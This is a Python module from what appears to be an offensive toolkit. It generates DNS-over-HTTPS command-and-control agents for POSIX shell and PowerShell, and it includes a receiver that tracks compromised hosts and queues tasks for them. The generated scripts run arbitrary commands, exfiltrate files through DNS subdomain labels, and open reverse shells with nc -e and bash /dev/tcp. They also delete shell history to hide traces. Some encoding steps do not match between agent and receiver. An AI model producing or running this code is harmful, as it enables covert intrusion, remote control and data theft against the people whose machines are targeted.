"""quantum.c2.reverseshell — DoH-based reverse shell payloads + Android C2.

The Android device runs the C2 server (NanoHTTPD). Targets connect back via
DNS-over-HTTPS — no port forwarding needed. The target polls for commands via
DoH TXT records and exfiltrates data via DoH subdomain labels.

Architecture:
  - Android C2 serves agent scripts at /s/<profile>
  - Target runs the agent, which polls DoH for tasks
  - Operator issues "reverse shell" via CLI/API -> task pushed to DNS TXT
  - Target receives task, connects back to Android C2 via DoH-encoded channel
  - All C2 traffic rides 443/tcp to public DoH resolvers (Cloudflare/Google)
"""
from __future__ import annotations

import base64
import json
import os
import time
from datetime import datetime

from quantum.core.env import QCLI_DIR
from quantum.core.logging import log


# ---------------------------------------------------------------------------
# DoH reverse shell agent generator
# ---------------------------------------------------------------------------

def generate_doh_reverse_shell_agent(domain, c2_host, interval=30):
    """Generate a POSIX shell agent that uses DoH for C2 communication.

    The agent:
    1. Polls DoH TXT records for commands (no inbound ports needed)
    2. Executes commands locally
    3. Exfiltrates output via DoH subdomain labels (base32-encoded)
    4. Supports 'reverse shell' command that connects back to C2 via DoH

    Args:
        domain: Operator-controlled DNS zone (e.g., "c2.example.com")
        c2_host: Android C2 host:port (for direct connect fallback)
        interval: Polling interval in seconds

    Returns:
        Path to the generated shell script
    """
    script = f"""#!/bin/sh
# DoH Reverse Shell Agent — {int(time.time())}
# C2 via DNS-over-HTTPS (no port forwarding needed)
# Domain: {domain} | C2: {c2_host} | Interval: {interval}s

QD="{domain}"
C2="{c2_host}"
INTERVAL={interval}
HOST="$(hostname 2>/dev/null || echo doh-$(id -u))"
ID=$(echo -n "$HOST" | head -c 12 | tr -c 'a-z0-9' 'x')

# DoH resolver endpoints (rotating)
DOH1="https://cloudflare-dns.com/dns-query"
DOH2="https://dns.google/resolve"

# --- DoH helpers ---
doh_resolve() {{
  local name="$1" rtype="${{2:-A}}"
  curl -s -m 10 -H 'accept: application/dns-json' \\
    "${{DOH1}}?name=${{name}}&type=${{rtype}}" 2>/dev/null || \\
  curl -s -m 10 "${{DOH2}}?name=${{name}}&type=${{rtype}}" 2>/dev/null
}}

doh_beacon() {{
  local data="$1"
  local b32=$(echo -n "$data" | base64 | tr -d '\\n' | tr '+' '-' | tr '/' '_' | tr -d '=')
  local chunks=$(echo "$b32" | fold -w 60)
  for chunk in $chunks; do
    doh_resolve "${{ID}}.${{chunk}}.${{QD}}" "A" >/dev/null 2>&1
  done
}}

doh_task() {{
  doh_resolve "cmd.${{QD}}" "TXT" 2>/dev/null | \\
    grep -o '"data":"[^"]*"' | head -1 | cut -d'"' -f4
}}

# --- Reverse shell via DoH signaling ---
# When task contains "shell", connect back to C2 via DoH channel
doh_reverse_shell() {{
  local c2_host="$1" c2_port="$2"
  # Signal that we're ready for reverse shell
  doh_beacon "SHELL_READY:$HOST:$c2_host:$c2_port"
  # Execute reverse shell (direct connect if possible, else DoH tunnel)
  if command -v nc >/dev/null 2>&1; then
    nc -e /bin/sh "$c2_host" "$c2_port" 2>/dev/null &
  elif command -v bash >/dev/null 2>&1; then
    bash -c 'exec 3<>/dev/tcp/'"$c2_host"'/'"$c2_port"'; cat <&3 | /bin/sh >&3 2>&3' &
  fi
  # Also tunnel via DoH as fallback
  while true; do
    OUTPUT=$(doh_beacon "SHELL_DATA:$HOST:$(date +%s)")
    sleep 5
  done
}}

# --- Main loop ---
FAIL=0
while true; do
  # Beacon: announce alive
  doh_beacon "HB:$HOST:$(date +%s):$(uname -a | head -c 50)"

  # Check for tasks
  TASK=$(doh_task | tr -d '"' | tr -d '\\\\')
  case "$TASK" in
    *'"cmd":"shell"'*)
      C2H=$(echo "$TASK" | sed -n 's/.*"c2_host":"\\([^"]*\\)".*/\\1/p')
      C2P=$(echo "$TASK" | sed -n 's/.*"c2_port":\\([0-9]*\\).*/\\1/p')
      [ -z "$C2H" ] && C2H="$C2"
      [ -z "$C2P" ] && C2P="8443"
      doh_reverse_shell "$C2H" "$C2P"
      ;;
    *'"cmd":"exec"'*)
      CMD=$(echo "$TASK" | sed -n 's/.*"command":"\\([^"]*\\)".*/\\1/p')
      [ -n "$CMD" ] && OUTPUT=$(eval "$CMD" 2>&1 | head -c 500)
      doh_beacon "EXEC:$HOST:$OUTPUT"
      ;;
    *'"cmd":"exfil"'*)
      FILE=$(echo "$TASK" | sed -n 's/.*"path":"\\([^"]*\\)".*/\\1/p')
      [ -n "$FILE" ] && DATA=$(base64 "$FILE" 2>/dev/null | head -c 200)
      [ -n "$DATA" ] && doh_beacon "EXFIL:$HOST:$DATA"
      ;;
    *'"cmd":"kill"'*)
      doh_beacon "KILL:$HOST"
      rm -f /var/tmp/.doh-* ~/.qcli*
      kill $$ 2>/dev/null
      ;;
    *'"cmd":"wipe"'*)
      rm -f /var/tmp/.doh-* ~/.qcli* ~/.bash_history
      ;;
  esac

  # Backoff on failure
  if [ "$FAIL" -gt 0 ]; then
    S=$(( FAIL * 5 ))
    [ "$S" -gt "$INTERVAL" ] && S="$INTERVAL"
    [ "$S" -gt 300 ] && S=300
    sleep "$S"
  else
    sleep "$INTERVAL"
  fi
done
"""
    fn = os.path.join(QCLI_DIR, "doh_reverse_shell.sh")
    with open(fn, "w", encoding="utf-8") as f:
        f.write(script)
    try:
        os.chmod(fn, 0o755)
    except OSError as e:
        log(f"doh_reverse_shell.sh chmod failed: {e}", "WARN")
    log(f"DoH reverse shell agent generated -> doh_reverse_shell.sh (domain {domain})", "C2")
    return fn


def generate_windows_doh_reverse_shell(domain, c2_host, interval=30):
    """Generate a PowerShell agent that uses DoH for C2 communication.

    The agent polls DoH TXT records for commands and exfiltrates via DoH
    subdomain labels. Supports reverse shell via DoH signaling.

    Args:
        domain: Operator-controlled DNS zone
        c2_host: Android C2 host:port
        interval: Polling interval in seconds

    Returns:
        Path to the generated PowerShell script
    """
    script = f"""# DoH Reverse Shell Agent (Windows) — {int(time.time())}
# C2 via DNS-over-HTTPS (no port forwarding needed)
# Domain: {domain} | C2: {c2_host} | Interval: {interval}s

$QD = "{domain}"
$C2 = "{c2_host}"
$Interval = {interval}
$ID = $env:COMPUTERNAME.Substring(0, [Math]::Min(12, $env:COMPUTERNAME.Length)).ToLower()

# DoH resolver endpoints
$DoH1 = "https://cloudflare-dns.com/dns-query"
$DoH2 = "https://dns.google/resolve"

function DoH-Resolve {{
    param([string]$Name, [string]$Type = "A")
    try {{
        $r = Invoke-RestMethod -Uri "$DoH1`?name=$Name&type=$Type" -Headers @{{"Accept"="application/dns-json"}} -TimeoutSec 10
        return $r
    }} catch {{
        try {{
            $r = Invoke-RestMethod -Uri "$DoH2`?name=$Name&type=$Type" -TimeoutSec 10
            return $r
        }} catch {{
            return $null
        }}
    }}
}}

function DoH-Beacon {{
    param([string]$Data)
    $b32 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data)).TrimEnd('=').Replace('+','-').Replace('/','_')
    for ($i = 0; $i -lt $b32.Length; $i += 60) {{
        $chunk = $b32.Substring($i, [Math]::Min(60, $b32.Length - $i))
        DoH-Resolve -Name "$ID.$chunk.$QD" -Type "A" | Out-Null
    }}
}}

function DoH-Task {{
    $r = DoH-Resolve -Name "cmd.$QD" -Type "TXT"
    if ($r.Answer) {{
        return ($r.Answer | Select-Object -First 1).data
    }}
    return $null
}}

function DoH-ReverseShell {{
    param([string]$C2Host, [string]$C2Port)
    DoH-Beacon -Data "SHELL_READY:$ID:$C2Host:$C2Port"
    # Direct reverse shell
    $client = New-Object System.Net.Sockets.TcpClient($C2Host, [int]$C2Port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    while ($client.Connected) {{
        $cmd = $reader.ReadLine()
        if ($cmd) {{
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $writer.WriteLine($output)
            $writer.Flush()
        }}
    }}
    $client.Close()
}}

# Main loop
while ($true) {{
    DoH-Beacon -Data "HB:$ID:$(Get-Date -Format o)"
    $task = DoH-Task
    if ($task) {{
        $task = $task.Trim('"')
        if ($task -match '"cmd":"shell"') {{
            $c2h = if ($task -match '"c2_host":"([^"]*)"') {{ $Matches[1] }} else {{ $C2 }}
            $c2p = if ($task -match '"c2_port":([0-9]*)') {{ $Matches[1] }} else {{ "8443" }}
            DoH-ReverseShell -C2Host $c2h -C2Port $c2p
        }} elseif ($task -match '"cmd":"exec"') {{
            $cmd = if ($task -match '"command":"([^"]*)"') {{ $Matches[1] }} else {{ "" }}
            if ($cmd) {{
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                DoH-Beacon -Data "EXEC:$ID:$output"
            }}
        }} elseif ($task -match '"cmd":"kill"') {{
            DoH-Beacon -Data "KILL:$ID"
            Remove-Item -Path "$env:TEMP\\.doh-*" -Force -ErrorAction SilentlyContinue
            exit
        }}
    }}
    Start-Sleep -Seconds $Interval
}}
"""
    fn = os.path.join(QCLI_DIR, "doh_reverse_shell.ps1")
    with open(fn, "w", encoding="utf-8") as f:
        f.write(script)
    log(f"DoH reverse shell agent (Windows) generated -> doh_reverse_shell.ps1 (domain {domain})", "C2")
    return fn


# ---------------------------------------------------------------------------
# Android C2 DoH beacon receiver
# ---------------------------------------------------------------------------

class DoHBeaconReceiver:
    """Receives DoH beacons from targets and dispatches tasks.

    The Android C2 server uses this to:
    1. Decode incoming DoH beacons (subdomain labels -> base32 -> data)
    2. Track active targets
    3. Push tasks to targets via DNS TXT records
    """

    def __init__(self, domain, state_file=None):
        self.domain = domain
        self.state_file = state_file or os.path.join(QCLI_DIR, "doh_beacons.json")
        self._beacons = self._load_beacons()

    def _load_beacons(self):
        try:
            with open(self.state_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}

    def _save_beacons(self):
        try:
            os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
            tmp = self.state_file + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self._beacons, f)
            os.replace(tmp, self.state_file)
        except Exception as e:
            log(f"DoHBeaconReceiver save failed: {e}", "WARN")

    def decode_beacon(self, subdomain_labels):
        """Decode a DoH beacon from subdomain labels.

        Args:
            subdomain_labels: List of subdomain labels (e.g., ["id", "chunk1", "chunk2"])

        Returns:
            Decoded data string or None
        """
        try:
            # Join labels and decode base32
            b32 = "".join(subdomain_labels).upper()
            # Add padding
            padding = (8 - len(b32) % 8) % 8
            b32 += "=" * padding
            data = base64.b32decode(b32)
            return data.decode("utf-8", errors="replace")
        except Exception:
            return None

    def record_beacon(self, host_id, data, rtype="A"):
        """Record an incoming beacon from a target.

        Args:
            host_id: Target host identifier
            data: Decoded beacon data
            rtype: DNS record type

        Returns:
            Dict with beacon info
        """
        ts = time.time()
        entry = {
            "host_id": host_id,
            "data": data,
            "rtype": rtype,
            "timestamp": datetime.now().isoformat(),
            "ts": ts,
        }
        if host_id not in self._beacons:
            self._beacons[host_id] = []
        self._beacons[host_id].append(entry)
        # Keep only last 100 beacons per host
        self._beacons[host_id] = self._beacons[host_id][-100:]
        self._save_beacons()
        log(f"DoH beacon from {host_id}: {data[:60]}", "C2")
        return entry

    def get_active_targets(self, max_age=300):
        """Get targets that have beacons within max_age seconds.

        Args:
            max_age: Maximum age in seconds

        Returns:
            List of active target dicts
        """
        now = time.time()
        active = []
        for host_id, beacons in self._beacons.items():
            if not beacons:
                continue
            last = beacons[-1]
            age = now - last.get("ts", 0)
            if age <= max_age:
                active.append({
                    "host_id": host_id,
                    "last_seen": last.get("timestamp"),
                    "age_seconds": int(age),
                    "beacon_count": len(beacons),
                })
        return active

    def push_task(self, host_id, command, params=None):
        """Push a task to a target via DNS TXT record.

        In production, this updates the DNS TXT record at:
            {host_id}.cmd.{domain}

        For now, we store it locally and the Android C2 serves it.

        Args:
            host_id: Target host identifier
            command: Command string (e.g., "shell", "exec", "exfil")
            params: Optional command parameters

        Returns:
            Task dict
        """
        task = {
            "cmd": command,
            "host_id": host_id,
            "ts": time.time(),
            "params": params or {},
        }
        # Store for the Android C2 to serve
        task_file = os.path.join(QCLI_DIR, f"doh_task_{host_id}.json")
        try:
            with open(task_file, "w", encoding="utf-8") as f:
                json.dump(task, f)
        except Exception as e:
            log(f"Task push failed: {e}", "WARN")
        log(f"Task pushed to {host_id}: {command}", "C2")
        return task

    def get_task(self, host_id):
        """Get the current task for a target.

        Args:
            host_id: Target host identifier

        Returns:
            Task dict or None
        """
        task_file = os.path.join(QCLI_DIR, f"doh_task_{host_id}.json")
        try:
            with open(task_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return None

    def clear_task(self, host_id):
        """Clear the current task for a target.

        Args:
            host_id: Target host identifier
        """
        task_file = os.path.join(QCLI_DIR, f"doh_task_{host_id}.json")
        try:
            os.remove(task_file)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Android C2 server integration
# ---------------------------------------------------------------------------

def android_c2_doh_endpoint(domain, host_id=None):
    """Handle a DoH beacon request on the Android C2.

    This is called when the Android C2 receives a DoH-encoded beacon.
    The beacon data is in the subdomain labels of the DNS query.

    Args:
        domain: Operator-controlled domain
        host_id: Optional target host ID

    Returns:
        Response dict
    """

    # In production, the Android C2 would receive the DNS query directly
    # For now, we simulate by checking for local beacon files
    receiver = DoHBeaconReceiver(domain)

    if host_id:
        # Record the beacon
        receiver.record_beacon(host_id, f"beacon from {host_id}")

        # Check for pending task
        task = receiver.get_task(host_id)
        if task:
            receiver.clear_task(host_id)
            return {"task": task}

    return {"act": "none"}


def generate_android_c2_config(domain, port=8443):
    """Generate configuration for the Android C2 server.

    Args:
        domain: Operator-controlled DNS domain
        port: C2 server port

    Returns:
        Config dict
    """
    return {
        "domain": domain,
        "port": port,
        "doh_resolvers": [
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/resolve",
        ],
        "agent_profiles": {
            "posix": "doh_reverse_shell.sh",
            "windows": "doh_reverse_shell.ps1",
        },
        "task_endpoint": f"https://{domain}/cmd",
        "beacon_endpoint": f"https://{domain}/beacon",
        "generated_at": datetime.now().isoformat(),
    }
